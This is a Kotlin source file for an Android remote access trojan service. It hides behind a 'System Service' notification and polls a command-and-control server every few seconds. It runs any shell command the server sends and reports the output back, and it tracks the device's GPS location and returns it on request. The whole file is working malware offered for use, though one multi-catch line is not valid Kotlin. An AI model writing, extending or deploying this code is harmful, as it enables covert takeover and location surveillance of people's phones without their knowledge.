// C:\Users\User\AppData\Local\Temp\kilo\rat\app\src\main\java\com\example\rat\RatService.kt
package com.example.rat

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.android.volley.Request
import com.android.volley.RequestQueue
import com.android.volley.Response
import com.android.volley.VolleyError
import com.android.volley.toolbox.JsonArrayRequest
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.IOException
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

/**
 * RAT Service that handles C2 communication and command execution.
 */
class RatService : Service() {

    private lateinit var requestQueue: RequestQueue
    private lateinit var locationManager: LocationManager
    private lateinit var locationListener: LocationListener
    private var lastKnownLocation: Location? = null
    private val handler = Handler()
    private val pollingInterval = 5000L // 5 seconds
    private val c2BaseUrl = "http://192.168.1.100:8080" // Change to your C2 server
    private val deviceId: String = Build.SERIAL // Simple device ID; consider using ANDROID_ID or generating a UUID

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildNotification())
        requestQueue = Volley.newRequestQueue(this)
        initLocationUpdates()
        startPolling()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        removeLocationUpdates()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "RAT Service"
            val descriptionText = "RAT Background Service"
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel("rat_service_channel", name, importance).apply {
                description = descriptionText
            }
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, "rat_service_channel")
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }

    private fun initLocationUpdates() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                lastKnownLocation = location
            }

            override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            override fun onProviderEnabled(provider: String?) {}
            override fun onProviderDisabled(provider: String?) {}
        }
        // Request location updates
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
        ) {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                0L,
                0f,
                locationListener
            )
        }
    }

    private fun removeLocationUpdates() {
        locationManager.removeUpdates(locationListener)
    }

    private fun startPolling() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                pollC2()
                handler.postDelayed(this, pollingInterval)
            }
        }, pollingInterval)
    }

    private fun pollC2() {
        val url = "$c2BaseUrl/poll?deviceId=$deviceId"
        val jsonArrayRequest = JsonArrayRequest(
            Request.Method.GET,
            url,
            null,
            Response.Listener { response ->
                handleCommands(response)
            },
            Response.ErrorListener { error ->
                Log.e("RatService", "Polling error: ${error.message}")
            }
        )
        requestQueue.add(jsonArrayRequest)
    }

    private fun handleCommands(response: JSONArray) {
        for (i in 0 until response.length()) {
            try {
                val commandObj = response.getJSONObject(i)
                val commandType = commandObj.getString("type")
                val commandId = commandObj.getString("id")
                when (commandType) {
                    "shell" -> {
                        val cmd = commandObj.getString("command")
                        val result = executeShellCommand(cmd)
                        sendResult(commandId, result)
                    }
                    "get_location" -> {
                        val loc = lastKnownLocation
                        val result = if (loc != null) {
                            "Latitude: ${loc.latitude}, Longitude: ${loc.longitude}"
                        } else {
                            "Location not available"
                        }
                        sendResult(commandId, result)
                    }
                    // Add more command types as needed
                    else -> {
                        sendResult(commandId, "Unknown command type: $commandType")
                    }
                }
            } catch (e: JSONException) {
                Log.e("RatService", "JSON parsing error: ${e.message}")
            }
        }
    }

    private fun executeShellCommand(command: String): String {
        val output = StringBuilder()
        try {
            val process = Runtime.getRuntime().exec(command)
            val bufferedReader = BufferedReader(
                InputStreamReader(process.inputStream)
            )
            var line: String?
            while (bufferedReader.readLine().also { line = it } != null) {
                output.append(line).append('\n')
            }
            val exitCode = process.waitFor()
            if (exitCode != 0) {
                val errorStream = BufferedReader(
                    InputStreamReader(process.errorStream)
                )
                var errorLine: String?
                while (errorStream.readLine().also { errorLine = it } != null) {
                    output.append(errorLine).append('\n')
                }
            }
        } catch (e: IOException | InterruptedException) {
            return "Error executing command: ${e.message}"
        }
        return output.toString()
    }

    private fun sendResult(commandId: String, result: String) {
        val url = "$c2BaseUrl/result"
        val jsonObject = JSONObject().apply {
            put("deviceId", deviceId)
            put("commandId", commandId)
            put("result", result)
        }
        val jsonObjectRequest = JsonObjectRequest(
            Request.Method.POST,
            url,
            jsonObject,
            Response.Listener { response ->
                Log.d("RatService", "Result sent successfully")
            },
            Response.ErrorListener { error ->
                Log.e("RatService", "Failed to send result: ${error.message}")
            }
        )
        requestQueue.add(jsonObjectRequest)
    }
}